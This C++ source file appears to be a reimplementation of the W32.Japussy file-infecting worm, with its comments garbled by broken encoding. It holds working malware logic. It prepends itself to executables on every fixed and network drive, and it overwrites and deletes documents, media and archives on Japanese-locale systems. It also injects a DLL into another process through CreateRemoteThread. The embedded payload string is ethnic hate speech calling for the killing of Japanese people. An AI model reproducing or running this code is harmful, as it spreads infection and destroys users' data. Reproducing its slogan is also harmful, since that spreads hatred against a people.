
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>
#include "windows.h"
#include <tlhelp32.h>
#include "resource.h"

using namespace std;

std::string programName, pathProgramName;

int HeaderSize = 186368;                 //������Ĵ�С
int IconOffset = 0x12EB8;                //PE�ļ���ͼ���ƫ����
int IconSize = 0x2E8;                    //PE�ļ���ͼ��Ĵ�С--744�ֽ�
int IconTail = IconOffset + IconSize;    //PE�ļ���ͼ���β��
int ID = 0x44444444;                     //��Ⱦ���

//�����룬�Ա�д��
string Catchword = "If a race need to be killed out, it must be Yamato. "
    "If a country need to be destroyed, it must be Japan! "
    "*** W32.Japussy.Worm.A ***";

PROCESS_INFORMATION Pi;
STARTUPINFO Si = { sizeof(Si) };

bool IsJap = false;//���Ĳ���ϵͳ���

void InfectOneFile(const std::string& pathFileName, const std::string& FileName);

bool IsWin9x() {
    OSVERSIONINFO Ver;
    Ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&Ver)) {
        return false;
    }
    else {
        if (Ver.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS) //Win9x
            return true;
    }
    return false;
}

void ExtractFile(const string& FileName) {

    std::ifstream sStream(pathProgramName, ios::in | ios::binary); //�����ļ��������ļ��ϲ�����ļ�
    std::ofstream dStream(FileName, ios::out | ios::binary); //�����ļ����ļ��������ո�

    char c[1] = { 0 };
    std::string fileBuff;
    sStream.seekg(HeaderSize); //����ͷ���Ĳ�������
    while (sStream.read(c, 1)) {
        fileBuff.push_back(c[0]);
    }

    dStream.write(fileBuff.c_str(), fileBuff.length()); //���4�ֽڱ�־λҲ�����ȥ�������ظ�����
    sStream.close();
    dStream.close();
}

void SmashFile(string FileName) {

    try {

        SetFileAttributes(FileName.c_str(), FILE_ATTRIBUTE_NORMAL); //ȥ��ֻ������
        std::fstream fileStream(FileName, ios::in | ios::binary | ios::out);  //���ļ�

        fileStream.seekg(0, fileStream.end);
        int fileSize = fileStream.tellg();   //�ļ���С

        int Max = rand() % 10 + 5;  //д����������������
        int Mass = fileSize / Max;  //ÿ�������Ĵ�С
        for (int i = 0; i < Max; i++) {
            fileStream.seekg(i * Mass, fileStream.beg); //��λ
            fileStream.write(Catchword.c_str(), Catchword.length());  //д�������룬���ļ������ƻ���  ---  д�����������޷�ͨ�����̼������лָ�
        }
        fileStream.close(); //�ر��ļ�
        remove(FileName.c_str());
    }
    catch (...) {
        //   
    }
}

void LoopFiles(const std::string& Path, const std::string& Mask) {

    WIN32_FIND_DATA findFileData;
    string FullPathName = Path + "\\" + Mask;

    HANDLE hFind = FindFirstFile(FullPathName.c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("search directory error:%s\n", FullPathName.c_str());
        return;
    }

    std::vector<std::string> subDirectory;
    do {
        if (findFileData.cFileName[0] != '.') {
            //printf("%s\\%s\n", Path.c_str(), findFileData.cFileName);
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                subDirectory.push_back(Path + "\\" + findFileData.cFileName);
            }
            else {
                string fileName = findFileData.cFileName;
                std::for_each(fileName.begin(), fileName.end(), [&](char& c) { c = ::toupper(c); });
                std::string pathFileName = Path + "\\" + fileName;
                auto nPos = fileName.find_last_of('.');
                if (nPos != std::string::npos) {
                    string Ext = fileName.substr(nPos);//��ȡ�ļ���׺
                    if ((Ext == ".EXE") || (Ext == ".SCR")) {
                        InfectOneFile(pathFileName, fileName); //��Ⱦ��ִ���ļ�        
                    }
                    else if ((Ext == ".HTM") || (Ext == ".HTML") || (Ext == ".ASP")) {
                        //��ȾHTML��ASP�ļ�����Base64�����Ĳ���д��
                        //��Ⱦ�������ҳ�������û�
                        //��λ���ֵ�Ը�����֮��
                    }
                    else if (Ext == ".WAB") { //Outlook��ַ���ļ�
                        //��ȡOutlook�ʼ���ַ
                    }
                    else if (Ext == ".ADC") {  //Foxmail��ַ�Զ�����ļ�
                        //��ȡFoxmail�ʼ���ַ
                    }
                    else if (Ext == "IND") {//Foxmail��ַ���ļ�
                        //��ȡFoxmail�ʼ���ַ
                    }
                    else {
                        if (IsJap) { //�����Ĳ���ϵͳ
                            if ((Ext == ".DOC") || (Ext == ".XLS") || (Ext == ".MDB") || (Ext == ".MP3") || (Ext == ".RM") || (Ext == ".RA") ||
                                (Ext == ".WMA") || (Ext == ".ZIP") || (Ext == ".RAR") || (Ext == ".MPEG") || (Ext == ".ASF") || (Ext == ".JPG") ||
                                (Ext == ".JPEG") || (Ext == ".GIF") || (Ext == ".SWF") || (Ext == ".PDF") || (Ext == ".CHM") || (Ext == ".AVI")) {
                                SmashFile(pathFileName); //�ݻ��ļ�
                            }
                        }
                    }
                }
                //��Ⱦ��ɾ��һ���ļ���˯��200���룬����CPUռ���ʹ���������
                Sleep(200);
            }
        }

        //����ǵ�ǰ·�����߸�Ŀ¼�Ŀ�ݷ�ʽ����������ͨĿ¼����Ѱ����һ��Ŀ¼�����ļ�
        if (!::FindNextFile(hFind, &findFileData)) {
            MSG msg;
            PeekMessage(&msg, 0, 0, 0, PM_REMOVE); //������Ϣ���У�����������
            break;
        }
    } while (true);
    ::FindClose(hFind);

    for (int i = 0; i < subDirectory.size(); i++) {
        LoopFiles(subDirectory[i], Mask);
    }
}

void SendMail() {//�˴�ʡ���˴�Σ���ԵĴ���
    //
}

void InfectOneFile(const std::string& pathFileName, const std::string& fileName) {

    try { //�������ļ����ڱ�ʹ�ã��˳�  
        if (fileName == "JAPUSSY.EXE") { //���Լ��򲻸�Ⱦ  
            return;
        }

        if (fileName != "MFCAPPLICATION1.EXE") {
            return;
        }

        bool Infected = false;
        bool IsPE = false;

        std::ifstream SrcStream(pathFileName, ios::in | ios::binary);  //��ȡԭ�ļ�����������

        //�ж��Ƿ��Ѿ���Ⱦ����
        char buff[32] = { 0 };
        for (int i = 0; i < 0x108; i = i + 2) {
            SrcStream.seekg(i, SrcStream.beg);
            SrcStream.read(buff, 2);
            if ((buff[0] == 0x50) && (buff[1] == 0x45)) { //PE���
                IsPE = true; //��PE�ļ�
                break;
            }
        }

        int iID = 0;
        SrcStream.seekg(-4, SrcStream.end); //����Ⱦ���
        SrcStream.read((char*)&iID, 4);

        SrcStream.seekg(0, SrcStream.end);
        int fileSize = SrcStream.tellg(); //�����ļ���С�������Ⱦ��ʱ���õ�

        //SrcStream.close(); �����ݲ��رգ����滹�õ�

        if ((iID == ID) || (fileSize < 10240)) { //̫С���ļ�����Ⱦ
            Infected = true;
        }
        if (Infected || !IsPE) {
            return;
        }

        std::ifstream HdrStream(pathProgramName, ios::in | ios::binary); //�����ļ�
        HdrStream.seekg(0, HdrStream.end);
        int virusSize = HdrStream.tellg();
        HdrStream.seekg(0, HdrStream.beg);
        printf("virus fileSize:%d\n", virusSize);

        char c[1] = { 0 };
        std::string filebuff;
        while (HdrStream.read(c, 1)) { //�����ļ�����
            filebuff.push_back(c[0]);
        }
        //д�벡���ļ�ͼ��
        SrcStream.seekg(0, SrcStream.beg);
        while (SrcStream.read(c, 1)) { //ԭ�ļ�����
            filebuff.push_back(c[0]);
        }

        c[0] = 0x44;
        for (int i = 0; i < 4; i++)
            filebuff.push_back(c[0]);  //�ļ����д���־ 0x44444444

        std::ofstream DstStream(pathFileName, ios::out | ios::binary); //����д��ԭ�ļ�
        DstStream.write(filebuff.c_str(), filebuff.length());
        SrcStream.close();
        HdrStream.close();
        DstStream.close();

    }
    catch (...) {
        //
    }
}

void FillStartupInfo(STARTUPINFO& Si, int State) {
    Si.cb = sizeof(Si);
    Si.lpReserved = NULL;
    Si.lpDesktop = NULL;
    Si.lpTitle = NULL;
    Si.dwFlags = STARTF_USESHOWWINDOW;
    Si.wShowWindow = State;
    Si.cbReserved2 = 0;
    Si.lpReserved2 = NULL;
}

std::vector<std::string> GetDrives() {
    std::vector<std::string> result;
    for (int i = 0; i < 25; i++) { //����26����ĸ
        char D = (i + 65);
        std::string Str = string(1, D) + ':';
        int DiskType = GetDriveType(Str.c_str());

        //�õ����ش��̺�������
        if ((DiskType == DRIVE_FIXED) || (DiskType == DRIVE_REMOTE))
            result.push_back(string(1, D));
    }
    return result;
}

void InfectFiles() {
    if (GetACP() == 932) { //���Ĳ���ϵͳ
        IsJap = true; //ȥ���ɣ�
    }

    //�õ���д�Ĵ����б�
    std::vector<std::string> DriverList = GetDrives();

    do {
        int Len = DriverList.size();
        for (int i = 0; i < Len; i++) { //����ÿ������������
            printf("***************driver:%s\n", DriverList[i].c_str());
            LoopFiles(DriverList[i] + ":", "*.*"); //��Ⱦ֮
        }
    } while (true);  //��ѭ��
    SendMail(); //�������ʼ�
    Sleep(1000 * 60 * 5); //˯��5����
}

DWORD GetProcessIDByName(const char* pName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return NULL;
    }
    PROCESSENTRY32 pe = { sizeof(pe) };
    for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
        if (strcmp(pe.szExeFile, pName) == 0) {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
        //printf("%-6d %s\n", pe.th32ProcessID, pe.szExeFile);
    }
    CloseHandle(hSnapshot);
    return 0;
}

void main()
{
    if (IsWin9x()) { //��Win9x
        //RegisterServiceProcess(GetCurrentProcessID, 1) //ע��Ϊ�������
    }
    else { //WinNT
        //Զ���߳�ӳ�䵽Explorer����   ����Ϊ�˲���ע�뵽Rouji.exe����
        DWORD processId = GetProcessIDByName("Rouji.exe");
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

        if (hProcess == NULL)
            return;

        HMODULE modHandle = GetModuleHandle("Kernel32"); //��Ϊkernel32 ÿһ��windows������̿ռ��ж��� ������������LOADLIBRARY��������

        char szLibPath[_MAX_PATH] = "D:\\develop\\Project1\\x64\\Debug\\Inject.dll"; //ָ��ע��֮��Ŀ�����Ҫ���ص�DLL
        void* pLibRemote = VirtualAllocEx(hProcess, NULL, sizeof(szLibPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)GetProcAddress(modHandle, "LoadLibraryA");
        WriteProcessMemory(hProcess, pLibRemote, (void*)szLibPath, sizeof(szLibPath), NULL);

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, addr, pLibRemote, 0, NULL);

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
    }

    char szFileFullPath[MAX_PATH] = { 0 };
    ::GetModuleFileNameA(NULL, szFileFullPath, MAX_PATH);//��ȡ�ļ�·

    printf("szFileFullPath:%s\n", szFileFullPath);

    //�����ԭʼ�������Լ�                         
    pathProgramName = szFileFullPath;// argv[0];
    programName = pathProgramName.substr(pathProgramName.find_last_of('\\') + 1);
    if (programName == "Japussy.exe") {
        InfectFiles(); //��Ⱦ�ͷ��ʼ�
    }
    else {//�Ѽ����������������ˣ���ʼ���� 
        string TmpFile = pathProgramName; //������ʱ�ļ�
        TmpFile = TmpFile.substr(0, TmpFile.length() - 4);
        TmpFile = TmpFile + " .exe"; //�����������ļ�����һ���ո�
        printf("pathProgramName:%s TmpFile:%s\n", pathProgramName.c_str(), TmpFile.c_str());
        ExtractFile(TmpFile); //����֮
        FillStartupInfo(Si, SW_SHOWDEFAULT);
        CreateProcess((LPSTR)TmpFile.c_str(), NULL, NULL, NULL, TRUE, 0, NULL, ".", &Si, &Pi); //�����½���������������
        InfectFiles(); //��Ⱦ�ͷ��ʼ�
    }
}
